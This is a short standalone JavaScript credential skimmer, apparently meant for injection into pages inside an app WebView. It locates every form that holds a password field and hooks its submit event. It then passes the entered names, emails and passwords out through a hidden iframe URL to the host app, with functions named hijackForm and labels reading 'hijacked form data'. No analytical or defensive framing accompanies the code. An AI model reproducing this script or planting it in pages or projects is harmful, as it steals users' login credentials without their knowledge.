function sendDataToWebView(email, password) {
	var iframe = document.createElement('IFRAME'),
		delimiter = ':::';
	iframe.setAttribute('src', 'js-frame' + delimiter + email + delimiter + password);
	document.documentElement.appendChild(iframe);
	iframe.parentNode.removeChild(iframe);
	iframe = null;
}
function getTextFields(el) {
	return Array.prototype.filter.call(el.getElementsByTagName('INPUT'), isTextField);
}
function isTextField(input) {
	var type = input.type;
	return !type || type === 'password' || type === 'text';
}
function isPassword(input) {
	return input.type === 'password';
}
function getFormFromPassword(input) {
	var p = input;
	while (p = p.parentNode) {
		if (p.tagName.toLowerCase() === 'form') {
			return p;
		}
	}
	return null;
}
function hijackForm(form) {
	sendDataToWebView('hijacked form: action=', form.action);
	form.addEventListener('submit', submitListener);
}
function submitListener() {
	sendDataToWebView('hijacked form data: ', JSON.stringify(getFormData(this)));
}
function toFieldData(field) {
	return [field.name, field.value];
}
function getFormData(form) {
	return getTextFields(form).map(toFieldData);
}
var allInputs = getTextFields(document),
	allPasswords = allInputs.filter(isPassword),
	forms = allPasswords.map(getFormFromPassword);
forms.forEach(hijackForm);
(function(){
	return 'planted';
})();

